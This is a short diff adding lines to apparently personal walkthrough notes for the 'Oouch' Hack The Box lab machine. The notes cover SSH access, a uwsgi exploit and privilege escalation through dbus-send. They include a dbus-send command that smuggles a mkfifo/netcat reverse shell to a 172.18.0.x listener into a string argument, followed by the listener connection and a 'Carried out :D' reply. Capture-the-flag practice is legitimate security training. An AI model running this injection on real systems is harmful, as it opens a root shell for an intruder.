@@ -144,3 +144,10 @@ ip a reveals some addresses we can use qtc's ssh key to get into
 code directory tells us where dbus writes to 
 exploit uwsgi to get www-data who can run dbus-send as root
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block  htb.oouch.Block.Block "string:;rm /tmp/.0; mkfifo /tmp/.0; cat /tmp/.0 | /bin/bash -i 2>&1 | nc 172.18.0.1 1234 >/tmp/.0;"
+
+
+connect to [10.10.15.100] from consumer.oouch.htb [10.10.10.177] 60000
+dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block  htb.oouch.Block.Block "string:;rm /tmp/.0; mkfifo /tmp/.0; cat /tmp/.0 | /bin/bash -i 2>&1 | nc 172.18.0.5 1234 >/tmp/.0;"
+method return time=1592669092.291353 sender=:1.3 -> destination=:1.1385 serial=4 reply_serial=2
+   string "Carried out :D"
+
